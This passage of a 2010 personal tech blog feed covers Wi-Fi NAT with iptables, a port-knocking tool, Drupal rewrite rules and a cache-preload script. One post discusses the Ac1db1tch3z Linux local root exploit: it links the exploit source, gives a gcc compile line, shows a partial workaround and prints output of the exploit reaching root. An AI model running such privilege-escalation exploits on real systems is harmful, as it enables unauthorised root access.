</code></pre></div><p>Before you move on to next step we&rsquo;ll have to assign <strong>wlan1</strong> an IP within our network range, otherwise the clients won&rsquo;t be able to communicate with our interface.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ifconfig wlan1 inet 10.0.0.1 netmask 10.0.0.255
</code></pre></div><p>Now start the <strong>dhcp server</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># /etc/init.d/isc-dhcp-server start
Starting ISC DHCP server: dhcpd.
# tail -n 100 /var/log/syslog
...
Nov 25 20:03:16 nat dhcpd: Internet Systems Consortium DHCP Server 4.1.1-P1
Nov 25 20:03:16 nat dhcpd: Copyright 2004-2010 Internet Systems Consortium.
Nov 25 20:03:16 nat dhcpd: All rights reserved.
Nov 25 20:03:16 nat dhcpd: For info, please visit https://www.isc.org/software/dhcp/
Nov 25 20:03:16 nat dhcpd: Wrote 11 leases to leases file.
</code></pre></div><h2 id="do-some-tests">Do some tests</h2>
<p>Let&rsquo;s say host <em><code>BlackTiny</code></em> is listening for incomming connections and host <code>*Daemon</code>* would like to connect to <em><code>BlackTiny</code></em>. <strong>Start with the client</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ifconfig [wifi-interface] up
# iwconfig [wifi-interface] essid &#34;HackLAN&#34; 
# dhclient [wifi-interface]
...
bound to 10.0.0.10 -- renewal in 251 seconds.
</code></pre></div><p>As you see our client <em><code>Daemon</code></em> got an IP: 10.0.0.10. Let&rsquo;s have a look at the <strong>server/host side</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># tail -f /var/log/syslog
Nov 25 20:09:43 nat dhcpd: DHCPACK on 10.0.0.10 to - (Daemon) via wlan1
Nov 25 20:09:43 nat dhcpd: DHCPREQUEST for 10.0.0.10 (10.0.0.1) from - (Daemon) via wlan1
Nov 25 20:09:43 nat dhcpd: DHCPACK on 10.0.0.10 to - (Daemon) via wlan1
Nov 25 20:12:38 nat dhcpd: DHCPREQUEST for 10.0.0.10 from - (Daemon) via wlan1
Nov 25 20:12:38 nat dhcpd: DHCPACK on 10.0.0.10 to - (Daemon) via wlan1

# ping 10.0.0.10
PING 10.0.0.10 (10.0.0.10) 56(84) bytes of data.
64 bytes from 10.0.0.10: icmp_req=1 ttl=64 time=3.59 ms
64 bytes from 10.0.0.10: icmp_req=2 ttl=64 time=2.55 ms
^C
--- 10.0.0.10 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 2.557/3.076/3.596/0.522 ms
</code></pre></div><p>So everything seems to work. How about Internet connectivity?! **Client <code>*Daemon***</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ping h.de
ping: unknown host h.de
</code></pre></div><p>Oh &hellip; I have forgotten about that. We&rsquo;ll have to allow <em><code>Daemon</code></em> to access the Internet through <em><code>BlackTiny</code></em>. Move on to the next step.</p>
<h2 id="do-the-cool-stuff">Do the cool stuff</h2>
<p>FirstÂ  of all we&rsquo;ll enable port forwarding on <em><code>BlackTiny</code></em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># sysctl -w net.ipv4.ip_forward=1
net.ipv4.ip_forward = 1
</code></pre></div><p>Now we&rsquo;ll do some magic <strong>iptables</strong> stuff:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># # flush all previous entries
# iptables -F
# iptables -t nat -F
# iptables -L
# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
# iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
</code></pre></div><p>Now we will enable <strong>MASQUERADING</strong>Â  on <strong>wlan0</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
</code></pre></div><p>That means every timeÂ  a packet from <em><code>Daemon</code></em> is sent to other network like its own one, this certain packet will first get in its header the IP address of <strong>wlan0</strong> and be forwarded to the next station till it reaches its destination (see <em>Big Picture</em>). Any outgoing/forwarded packet will be masqueraded. So all packets will appear to come from the masquerading host (<em><code>BlackTiny</code></em>).Â  There is nothing more to say about it. That&rsquo;s the all stuff behind it.</p>
<p>Alternatively you could use the SNAT target within iptables:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># iptables -t nat -A POSTROUTING -p tcp -o wlan0 -j SNAT --to-source [ip range]
</code></pre></div><p>Here is an explanation( found on <a href="http://www.linuxtopia.org/Linux_Firewall_iptables/x4658.html">Linuxtopia.com</a>):</p>
<blockquote>
<p>&ldquo;The <b class="COMMAND">-to-source</b> option is used to specify which source the packet should use. This option, at its simplest, takes one IP address which we want to use for the <b class="COMMAND">source IP</b> address in the <b class="COMMAND">IP header</b>. [&hellip;] The -to-source IP numbers could then, for instance, be something like: 194.236.50.155-194.236.50.160. [&hellip;] We can also specify a range of ports to be used by <b class="COMMAND">SNAT</b>. All the source ports would then be confined to the ports specified. The port bit of the rule would then look like in the example above, :1024-32000. This is only valid if -p tcp or -p udp was specified somewhere in the match of the rule in question. [&hellip;]&rdquo;</p>
</blockquote>
<h2 id="give-it-a-try">Give it a try</h2>
<p>Client <em><code>Daemon</code></em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ping h.de
PING h.de (212.34.170.3) 56(84) bytes of data.
64 bytes from plesk.odn.de (212.34.170.3): icmp_req=1 ttl=50 time=39.6 ms
64 bytes from plesk.odn.de (212.34.170.3): icmp_req=2 ttl=50 time=33.8 ms
64 bytes from plesk.odn.de (212.34.170.3): icmp_req=3 ttl=50 time=60.8 ms
^C
--- h.de ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 33.835/44.782/60.853/11.609 ms

# tracepath h.de
 1:  Daemon                                      0.225ms pmtu 1500
 1:  localhost                                             3.081ms 
 1:  localhost                                             4.630ms 
 2:  fritz.box                                            11.479ms 
 3:  178.0.84.130                                          9.902ms pmtu 576
 3:  178.0.80.1                                           26.146ms 
 4:  88.79.29.13                                          48.251ms 
 5:  88.79.28.213                                         33.242ms 
 6:  92.79.212.137                                        26.544ms 
 7:  ffm-145-254-19-106.arcor-ip.net                      73.856ms asymm  9 
 8:  Arcor.FRA-3-pos211.de.lambdanet.net                  34.915ms asymm 11 
 9:  FRA-3-eth010.de.lambdanet.net                        33.810ms asymm 12 
10:  NUE-2-eth210.de.lambdanet.net                        37.740ms asymm 13 
11:  ODN-NUE.de.lambdanet.net                             39.732ms asymm 13 
12:  c4506-1.nbg-1.odn.net                                37.717ms asymm 14 
13:  plesk.odn.de                                         39.540ms reached
     Resume: pmtu 576 hops 13 back 50
</code></pre></div><p>Have fun and keep it clean!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Find out your geolocation via MAC address</title>
      <link>https://blog.dornea.nu/2010/10/07/find-out-your-geolocation-via-mac-address/</link>
      <pubDate>Thu, 07 Oct 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/10/07/find-out-your-geolocation-via-mac-address/</guid>
      <content:encoded><![CDATA[<p>Today I found a very interesting article about geoposition localisation based on MAC addresses. MAC addresses ? Yeah, right! As securiteam described <a href="http://blogs.securiteam.com/index.php/archives/1450">here</a> it is possible to find out your location using Google&rsquo;s Location Services REST API. Further information can be found on Dinis Cruz <a href="http://diniscruz.blogspot.com/2010/10/using-mac-address-to-find-your-physical.html">blog</a>. But where is all the data coming from? You may also have noticed Google&rsquo;s Street View cars scanning your neighborhood for WLAN access points. Oh, I have forgotten about that: It wasn&rsquo;t Google&rsquo;s intention as stated <a href="http://googleblog.blogspot.com/2010/05/wifi-data-collection-update.html">here</a>. So MAC source no. 1 is identified. What about the rest? Somehow this equation has to make sense:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">HotSpot/Wlan + GPS + Google =  Your LOCATION!
</code></pre></div><p>Got it? No? It&rsquo;s your mobile phone which reveals your location. Next question should be: Why does Google known about my GPS position and the WLAN router I&rsquo;m using? Well because you&rsquo;re using house made products like <em>Android</em>. So dear Android users: It&rsquo;s about time to ponder about your own privacy.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Secure your server using icmpKNOCK</title>
      <link>https://blog.dornea.nu/2010/10/03/howto-secure-your-server-using-icmpknock/</link>
      <pubDate>Sun, 03 Oct 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/10/03/howto-secure-your-server-using-icmpknock/</guid>
      <content:encoded><![CDATA[<p>This time I&rsquo;d like to give you a short usage description of <a href="http://github.com/dorneanu/icmpKNOCK">icmpKNOCK</a> that was recently released. The main reason I wrote it was lack of security measurements on my boxes. I didn&rsquo;t want any sophisticated IDS tools nor complicated monitoring services. I wanted to implement something which will run on (almost) any platform without any external toolsb. Since the ping utility is available on most modern systems using ICMP packets to communicate with the server was the most reasonable approach. There are plenty of other <strong>port knocking</strong> tools but these are mostly binaries. These have to be first compiled on the running system which is bad. So the second thought was to use a programming language powerful enough to fulfill my needs and be portable. It had to be Python.</p>
<h2 id="getting-started">Getting started</h2>
<p>First you&rsquo;ll have to get the latest version of icmpKNOCK. Please check the SVN download <a href="http://github.com/dorneanu/icmpKNOCK">link</a> for the newest packages. Then make sure to upload the package to your server and copy it to a secret place where nobody - besides you - has read permissions on the actions file. Why is that important? Because the actions file contains your <code>secret</code> hex sequences used to trigger certain actions. So you don&rsquo;t want anybody to know these ones. In that case potential attackers might manipulate the behaviour of your system without noticing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">~/icmpknock/v0.2.r9# ls -l
total 32
-rw-r--r-- 1 root root   35 Sep  9 13:45 AUTHORS
-rw-r--r-- 1 root root  340 Sep  9 14:19 CHANGELOG
-rw-r--r-- 1 root root 1074 Sep 13 13:54 README
drwxr-xr-x 2 root root 4096 Sep 30 16:33 conf
-rwxr-xr-x 1 root root 4575 Sep  9 13:45 icmpKNOCK.py
drwxr-xr-x 2 root root 4096 Sep 30 16:11 modules
drwxr-xr-x 2 root root 4096 Sep 30 16:11 scripts
</code></pre></div><h2 id="generate-hex-sequences">Generate hex sequences</h2>
<p>Now you&rsquo;ll have to generate your keys. You could use MD4, MD5, SHA-1 etc hashes. This is what I did:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ for i in `seq 1 10`; 
do pwgen 20 1 | md5; 
done        
bf6e1e0c0ce8fedb43146e50d1b281f9                                                
d3ed14fb017c3b0afb8b2329fb010756
2ab616e0b85ff5e80a8bd274745d530f
c2a565c9132b4931f1c5cd20c1498604
57abd2bb3cc26413050b90cd7509c677
26ef6c1dede976ba48c1c4adbdf4ceae
cfdff084e3442c5b8613ac75aa5147ad
d047732f4c0b083f8f322437f0071bb9
56bb53f69f701975db0977f316cd6402
b124d903a6c510fbba2b1ccb23a11f2d
</code></pre></div><p>That should do the work. Now you&rsquo;ll have to edit your actions file (conf/actions.conf) and copy these values to it. Please have a look at the descriptive text inside the file for further information.</p>
<h2 id="define-actions">Define actions</h2>
<p>This is the most interesting part. In this HowTo I&rsquo;ll give you an example how to block/open SSH port 22 using icmpKNOCK. Therefor I&rsquo;ll be using iptables which should be available within every Linux distribution. So let&rsquo;s start&hellip;</p>
<p>For this tutorial the SSH port should be always closed. Let&rsquo;s define the action describing that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[stop_ssh]
keys = &lt;your secret keys here&gt;
payload = iptables -A INPUT -p tcp --dport 22 -j REJECT --reject-with tcp-reset
</code></pre></div><p>Everytime the server receives the secret hex sequences it will close port 22 to block any external connections. What about opening it?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[start_ssh]
keys = &lt;your secret keys here&gt;
payload = iptables -D INPUT -p tcp --dport 22 -j REJECT --reject-with tcp-reset
</code></pre></div><p>In that case you simply delete the previously created rule. Afterwards port 22 should be open again.</p>
<p>Of course: There are lot of other possible configurations. Perhaps it is a better idea to define only 1 action which allows you to connect to port 22 within 20 seconds, close the port again after 20 seconds and keep the established connections. Feel free to use your brain.</p>
<h2 id="prepare-your-scripts">Prepare your scripts</h2>
<p>Your server - along with the Python application - will listen for incoming ICMP packets. Your client will be the ping utility as described above. In order to send your sequences to the server you&rsquo;ll need a small bash script which will do the rest for you:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#cd2828;font-weight:bold">#!/bin/sh
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#40ffff">HOST</span>=&lt;your host here&gt;
<span style="color:#40ffff">keys</span>=&lt;your keys here&gt;<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>

<span style="color:#6ab825;font-weight:bold">for</span> k in <span style="color:#40ffff">$keys</span>
<span style="color:#6ab825;font-weight:bold">do</span>
   ping -c <span style="color:#3677a9">1</span> -p <span style="color:#40ffff">$k</span> <span style="color:#40ffff">$HOST</span>
<span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><p>That&rsquo;s all. Just name your script something like <code>start_ssh.sh</code> and run it every time you you&rsquo;ll connect to the server. The same applies to <code>cllosing the port</code>.</p>
<p>For any comments, new features or simply feedback, please use the comment functionality or drop me a mail.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>How to compile Robert you suck ^^</title>
      <link>https://blog.dornea.nu/2010/09/30/how-to-compile-robert-you-suck/</link>
      <pubDate>Thu, 30 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/30/how-to-compile-robert-you-suck/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2010/209/howto_compile_robert_you_suck.png" alt="How to compile robert you suck"></p>
<p>This is was too funny not to be posted</p>
<p>@gutefrage.net: In cause you don&rsquo;t know, try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gcc -o robert_you_suck robert_you_suck.c
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>DEADF700? Stuxnet!</title>
      <link>https://blog.dornea.nu/2010/09/27/deadf700-stuxnet/</link>
      <pubDate>Mon, 27 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/27/deadf700-stuxnet/</guid>
      <content:encoded><![CDATA[<p>The whole world seems to be concerned about this new worm&hellip; I think it was Stuxnet. Meanwhile a (hex?) pattern is putting the cat among the pigeons. Its about <strong>DEADF700</strong>. What could this be? The word is that it is the last command Stuxnet is waiting for. The last command before what? Before the whole building explodes? Let&rsquo;s come back to one&rsquo;s senses.</p>
<p>Some translations:</p>
<ul>
<li>Text: ÃƒÅ¾Ã‚Â­p</li>
<li>Binary: 11011110 10101101 11110111 00000000</li>
<li>Base64: 3q33AA==</li>
<li>DEC / Char: 222 173 247 0</li>
<li>MD2: 19844451167c6038fde316f1a4fadd7d</li>
<li>MD4: 864e882437c8324c06d485b3e505ab8d</li>
<li>MD5: 06f14a8de09a925e124034e457ce55a2</li>
<li>SHA1: fac6dd07345c0f7f23ab2cf7506bedcf33e4b451</li>
<li>RIPEMD-160: 08edfc88ccd3c2b0187e03bcf8b72894e8fd7908</li>
</ul>
<p>Sooooo ?!? Perhaps I don&rsquo;t see the wood for the trees. If you got some hints, PLEASE drop me a mail and help me solve this mystery.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>The Ac1db1tch3z exploit and &#34;Robert you suck&#34; thingie</title>
      <link>https://blog.dornea.nu/2010/09/17/the-ac1db1tch3z-exploit-and-robert-you-suck-thingie/</link>
      <pubDate>Fri, 17 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/17/the-ac1db1tch3z-exploit-and-robert-you-suck-thingie/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2010/202/robert_you_suck.png" alt="Rober you suck"></p>
<p>Yepp.. It&rsquo;s another one. I&rsquo;ve tested <a href="http://sota.gen.nz/compat2/robert_you_suck.c">it</a> on my own laptop and voila: BOOM! Anoher local root exploit is out there. In fact this exploit shouldn&rsquo;t have been released at all.. An earlier <a href="http://lists.grok.org.uk/pipermail/full-disclosure/2007-September/066025.html">incident</a> was reported in 2007.So why in God&rsquo;s sake is this malfunction still in the wild? We don&rsquo;t know it. I&rsquo;d call it stupidity, if you&rsquo;re fine with me. L33t hackers like Ac1db1tch3z seem to have <a href="http://ownage.pastebin.com/sjDzrFHT">antipathy</a> against good security researchers like Ben Hawkes. Nevertheless I was able to find a <a href="http://ownage.pastebin.com/sjDzrFHT">workaround</a> which will fix the problem. Unfortunately this doesn&rsquo;t fix the problem at all:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># echo &#39;:32bits:M:0:x7fELFx01::/bin/echo:&#39; &gt; /proc/sys/fs/binfmt_misc/register
$ ./boom
resolved symbol commit_creds to 0xffffffff81068009
resolved symbol prepare_kernel_cred to 0xffffffff81067f0c
mapping at 3f80000000
UID 0, EUID:0 GID:0, EGID:0
# id
uid=0(root) gid=0(root) Gruppen=0(root)&lt;/pre&gt;
</code></pre></div><p>So where is the solution?!Â  Check <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4573">this</a> and <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3301%25">this</a>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>icmpKNOCK v0.2 released</title>
      <link>https://blog.dornea.nu/2010/09/13/icmpknock-v0.2-released/</link>
      <pubDate>Mon, 13 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/13/icmpknock-v0.2-released/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;d like to announce the second main release of <a href="http://github.com/dorneanu/icmpKNOCK">icmpKNOCK</a>. I thought it was about time to release a new improved version. I&rsquo;ve mainly focused on the actions mechanism and tried to implement some flexible way of defining actions, adding key pattern and setting payloads. Besides that I have managed it to install a <a href="http://github.com/dorneanu">SVN service</a> in order to provide the latest development version of my current projects.</p>
<p>The <a href="https://github.com/dorneanu/icmpKNOCK/blob/master/CHANGELOG">CHANGELOG</a> for this version isn&rsquo;t quite long. There are no <code>new</code> features that have been added to this release. In fact I was busy cleaning up messy code and looking for bugs. I hope you&rsquo;ll enjoy it and don&rsquo;t esitate to drop me a mail if bugs were found.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Drupals clean urls using Lighttpd: Moved from Lua to rewrite-once</title>
      <link>https://blog.dornea.nu/2010/09/07/drupals-clean-urls-using-lighttpd-moved-from-lua-to-rewrite-once/</link>
      <pubDate>Tue, 07 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/07/drupals-clean-urls-using-lighttpd-moved-from-lua-to-rewrite-once/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ve been using Lighttpd + Drupal for a long time. In order to have those sexy clean urls, you&rsquo;ll have to do some rewrite stuff. A few months ago I found this Lua script, which served its purpose without any complications.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.lua" data-lang=".lua"><span style="color:#999;font-style:italic">-- little helper function</span>
<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">file_exists</span>(path)
<span style="color:#6ab825;font-weight:bold">local</span> attr = lighty.stat(path)
<span style="color:#6ab825;font-weight:bold">if</span> (attr) <span style="color:#6ab825;font-weight:bold">then</span>
<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>
<span style="color:#6ab825;font-weight:bold">else</span>
<span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>
<span style="color:#6ab825;font-weight:bold">end</span>
<span style="color:#6ab825;font-weight:bold">end</span>
<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">removePrefix</span>(str, prefix)
<span style="color:#6ab825;font-weight:bold">return</span> str:sub(<span style="color:#3677a9">1</span>,#prefix+<span style="color:#3677a9">1</span>) == prefix..<span style="color:#ed9d13">&#34;/&#34;</span> <span style="color:#6ab825;font-weight:bold">and</span> str:sub(#prefix+<span style="color:#3677a9">2</span>)
<span style="color:#6ab825;font-weight:bold">end</span>

<span style="color:#999;font-style:italic">-- prefix without the trailing slash</span>
<span style="color:#6ab825;font-weight:bold">local</span> prefix = <span style="color:#ed9d13">&#39;&#39;</span>

<span style="color:#999;font-style:italic">-- the magic</span>
<span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#6ab825;font-weight:bold">not</span> file_exists(lighty.env[<span style="color:#ed9d13">&#34;physical.path&#34;</span>])) <span style="color:#6ab825;font-weight:bold">then</span>
<span style="color:#999;font-style:italic">-- file still missing. pass it to the fastcgi backend</span>
request_uri = removePrefix(lighty.env[<span style="color:#ed9d13">&#34;uri.path&#34;</span>], prefix)
<span style="color:#6ab825;font-weight:bold">if</span> request_uri <span style="color:#6ab825;font-weight:bold">then</span>
lighty.env[<span style="color:#ed9d13">&#34;uri.path&#34;</span>] = prefix .. <span style="color:#ed9d13">&#34;/index.php&#34;</span>
<span style="color:#6ab825;font-weight:bold">local</span> uriquery = lighty.env[<span style="color:#ed9d13">&#34;uri.query&#34;</span>] <span style="color:#6ab825;font-weight:bold">or</span> <span style="color:#ed9d13">&#34;&#34;</span>
lighty.env[<span style="color:#ed9d13">&#34;uri.query&#34;</span>] = uriquery .. (uriquery ~= <span style="color:#ed9d13">&#34;&#34;</span> <span style="color:#6ab825;font-weight:bold">and</span> <span style="color:#ed9d13">&#34;&amp;&#34;</span> <span style="color:#6ab825;font-weight:bold">or</span> <span style="color:#ed9d13">&#34;&#34;</span>) .. <span style="color:#ed9d13">&#34;q=&#34;</span> .. request_uri
lighty.env[<span style="color:#ed9d13">&#34;physical.rel-path&#34;</span>] = lighty.env[<span style="color:#ed9d13">&#34;uri.path&#34;</span>]
lighty.env[<span style="color:#ed9d13">&#34;request.orig-uri&#34;</span>] = lighty.env[<span style="color:#ed9d13">&#34;request.uri&#34;</span>]
lighty.env[<span style="color:#ed9d13">&#34;physical.path&#34;</span>] = lighty.env[<span style="color:#ed9d13">&#34;physical.doc-root&#34;</span>] .. lighty.env[<span style="color:#ed9d13">&#34;physical.rel-path&#34;</span>]
<span style="color:#6ab825;font-weight:bold">end</span>
<span style="color:#6ab825;font-weight:bold">end</span>
<span style="color:#999;font-style:italic">-- fallthrough will put it back into the lighty request loop</span>
<span style="color:#999;font-style:italic">-- that means we get the 304 handling for free.</span>
</code></pre></div><p>Your <code>lighttpd.conf</code> should include - somewhere! - this lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Make Drupal&#39;s url SEXY
magnet.attract-physical-path-to = ( &#34;/etc/lighttpd/drupal.lua&#34; )
</code></pre></div><p>Well.. That&rsquo;s now history! I found a better way to do that rewritting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">url.rewrite-once = (
&#34;^/system/test/(.*)$&#34; =&gt; &#34;/index.php?q=system/test/$1&#34;,
&#34;^/search/node/(.*)$&#34; =&gt; &#34;/index.php?q=search/node/$1&#34;,
&#34;^/([^.?]*)?(.*)$&#34; =&gt; &#34;/index.php?q=$1&amp;$2&#34;,
&#34;^/([^.?]*)$&#34; =&gt; &#34;/index.php?q=$1&#34;
)
</code></pre></div><p>That should do the work. If any troubles, just let me know!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Speed up Drupal by preloading the page cache</title>
      <link>https://blog.dornea.nu/2010/09/04/speed-up-drupal-by-preloading-the-page-cache/</link>
      <pubDate>Sat, 04 Sep 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/09/04/speed-up-drupal-by-preloading-the-page-cache/</guid>
      <content:encoded><![CDATA[<p>If you need some technical background, have a look <a href="http://nadeausoftware.com/node/98">here</a>. The preload cache script I&rsquo;ve been using for a couple a months:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#cd2828;font-weight:bold">#!/bin/bash
</span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># Preload a web site&#39;s cache</span>
<span style="color:#999;font-style:italic">#</span>

<span style="color:#40ffff">site</span>=<span style="color:#ed9d13">&#34;dornea.nu&#34;</span>
<span style="color:#40ffff">tmp</span>=<span style="color:#ed9d13">&#34;downloads&#34;</span>
<span style="color:#40ffff">log</span>=<span style="color:#ed9d13">&#34;log.txt&#34;</span>

<span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;Crawling </span><span style="color:#40ffff">$site</span><span style="color:#ed9d13">.&#34;</span>

<span style="color:#999;font-style:italic"># Remove any prior downloaded files.</span>
rm -rf <span style="color:#40ffff">$tmp</span>

<span style="color:#999;font-style:italic"># Clear the page cache first.</span>
wget --quiet --delete-after http://<span style="color:#40ffff">$site</span>/[insert reset cache script here].php

<span style="color:#999;font-style:italic"># Crawl the site</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># Crawl arguments:</span>
<span style="color:#999;font-style:italic"># --recursive Crawl the site</span>
<span style="color:#999;font-style:italic"># --domains=example.com Only crawl pages from the site</span>
<span style="color:#999;font-style:italic"># --level=inf Continue to infinite depth</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># Temp file arguments:</span>
<span style="color:#999;font-style:italic"># --directory-prefix=downloads Save tmp files to the &#39;downloads&#39; directory</span>
<span style="color:#999;font-style:italic"># --force-directories Create directories for downloaded pages</span>
<span style="color:#999;font-style:italic"># --delete-after Delete downloaded files afterwards</span>
<span style="color:#999;font-style:italic">#</span>
<span style="color:#999;font-style:italic"># Verbosity arguments:</span>
<span style="color:#999;font-style:italic"># --output-file=log.txt Write a log to &#39;log.txt&#39;</span>
<span style="color:#999;font-style:italic"># --no-verbose Minimize log file output</span>
<span style="color:#999;font-style:italic">#</span>

wget
--recursive
--level=inf
--delete-after
--output-file=<span style="color:#40ffff">$log</span>
--domains=<span style="color:#40ffff">$site</span>
--force-directories
--directory-prefix=<span style="color:#40ffff">$tmp</span>
--no-verbose

http://<span style="color:#40ffff">$site</span>/

<span style="color:#999;font-style:italic"># When the crawl is done, the download files are removed.</span>
<span style="color:#999;font-style:italic"># Now remove the leftover directories too</span>
rm -rf <span style="color:#40ffff">$tmp</span>

<span style="color:#24909d">echo</span>
<span style="color:#24909d">echo</span> <span style="color:#ed9d13">&#34;Done. A log of the crawl is in &#39;</span><span style="color:#40ffff">$log</span><span style="color:#ed9d13">&#39;.&#34;</span>
</code></pre></div><p>The php script:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php"><span style="color:#cd2828;font-weight:bold">&lt;?php</span>
<span style="color:#ed9d13">/**
</span><span style="color:#ed9d13">* Clears the page cache.
</span><span style="color:#ed9d13">*/</span>
<span style="color:#6ab825;font-weight:bold">include_once</span> <span style="color:#ed9d13">&#39;./includes/bootstrap.inc&#39;</span>;
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
